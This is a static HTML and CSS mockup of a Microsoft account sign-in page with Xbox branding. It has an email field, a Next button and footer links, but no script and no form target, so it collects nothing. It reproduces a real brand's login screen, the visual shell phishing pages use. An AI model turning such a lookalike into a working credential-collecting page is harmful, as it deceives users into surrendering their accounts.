<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Microsoft</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1d3a 0%, #2d3561 50%, #1a1d3a 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
        }

        body::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -20%;
            width: 800px;
            height: 800px;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(88, 101, 242, 0.1) 0%, transparent 70%);
        }

        body::after {
            content: '';
            position: absolute;
            bottom: -30%;
            left: -10%;
            width: 600px;
            height: 600px;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(88, 101, 242, 0.08) 0%, transparent 70%);
        }

        .microsoft-logo {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 32px;
            position: relative;
            z-index: 1;
        }

        .logo-squares {
            display: grid;
            grid-template-columns: repeat(2, 11px);
            grid-template-rows: repeat(2, 11px);
            gap: 1px;
        }

        .logo-square {
            width: 11px;
            height: 11px;
        }

        .logo-square:nth-child(1) { background: #f25022; }
        .logo-square:nth-child(2) { background: #7fba00; }
        .logo-square:nth-child(3) { background: #00a4ef; }
        .logo-square:nth-child(4) { background: #ffb900; }

        .logo-text {
            color: white;
            font-size: 20px;
            font-weight: 400;
            letter-spacing: -0.5px;
        }

        .signin-container {
            background: rgba(45, 53, 97, 0.85);
            backdrop-filter: blur(40px);
            border-radius: 8px;
            padding: 44px 44px 32px;
            width: 440px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            position: relative;
            z-index: 1;
        }

        h1 {
            color: white;
            font-size: 28px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
        }

        .subtitle {
            color: rgba(255, 255, 255, 0.9);
            font-size: 15px;
            text-align: center;
            margin-bottom: 36px;
        }

        .input-group {
            margin-bottom: 16px;
        }

        input[type="text"],
        input[type="email"] {
            width: 100%;
            padding: 12px 14px;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 2px;
            color: white;
            font-size: 15px;
            outline: none;
            transition: all 0.2s;
        }

        input[type="text"]:focus,
        input[type="email"]:focus {
            border-color: rgba(255, 255, 255, 0.4);
            background: rgba(0, 0, 0, 0.4);
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }

        .forgot-link {
            color: #3aa557;
            text-decoration: none;
            font-size: 13px;
            display: inline-block;
            margin-bottom: 24px;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .next-button {
            width: 100%;
            padding: 12px;
            background: #3aa557;
            color: white;
            border: none;
            border-radius: 2px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }

        .next-button:hover {
            background: #2d8a44;
        }

        .create-account {
            text-align: center;
            margin-top: 24px;
            color: rgba(255, 255, 255, 0.9);
            font-size: 13px;
        }

        .create-account a {
            color: #3aa557;
            text-decoration: none;
            margin-left: 4px;
        }

        .create-account a:hover {
            text-decoration: underline;
        }

        .xbox-logo {
            text-align: center;
            margin-top: 48px;
            position: relative;
            z-index: 1;
        }

        .xbox-logo svg {
            width: 80px;
            height: 80px;
            opacity: 0.8;
        }

        .footer {
            position: fixed;
            bottom: 20px;
            display: flex;
            gap: 24px;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.7);
            z-index: 1;
        }

        .footer a {
            color: rgba(255, 255, 255, 0.7);
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .private-browsing {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 11px;
            color: rgba(255, 255, 255, 0.6);
            text-align: center;
            z-index: 1;
        }

        .private-browsing a {
            color: #3aa557;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="microsoft-logo">
        <div class="logo-squares">
            <div class="logo-square"></div>
            <div class="logo-square"></div>
            <div class="logo-square"></div>
            <div class="logo-square"></div>
        </div>
        <span class="logo-text">Microsoft</span>
    </div>

    <div class="signin-container">
        <h1>Sign in</h1>
        <p class="subtitle">Use your Microsoft account.</p>

        <div class="input-group">
            <input type="text" placeholder="Email or phone number">
        </div>

        <a href="#" class="forgot-link">Forgot your username?</a>

        <button class="next-button">Next</button>

        <div class="create-account">
            New to Microsoft? <a href="#">Create an account</a>
        </div>
    </div>

    <div class="xbox-logo">
        <svg viewBox="0 0 88 88" fill="none" xmlns="http://www.w3.org/2000/svg">
            <circle cx="44" cy="44" r="43" stroke="white" stroke-width="2" fill="none"/>
            <path d="M35.5 27C30 32 28 38 28 44C28 53 34.5 60.5 43 62C43 55 38 48 35.5 44C33.5 41 33 37 35.5 27Z" fill="white"/>
            <path d="M52.5 27C58 32 60 38 60 44C60 53 53.5 60.5 45 62C45 55 50 48 52.5 44C54.5 41 55 37 52.5 27Z" fill="white"/>
            <path d="M44 24C39 24 35 25 31.5 27C34 31 38 34 44 38C50 34 54 31 56.5 27C53 25 49 24 44 24Z" fill="white"/>
        </svg>
    </div>

    <div class="footer">
        <a href="#">Help and feedback</a>
        <a href="#">Terms of use</a>
        <a href="#">Privacy and cookies</a>
    </div>

    <div class="private-browsing">
        Use private browsing if this is not your device. <a href="#">Learn more</a>
    </div>
</body>
</html>
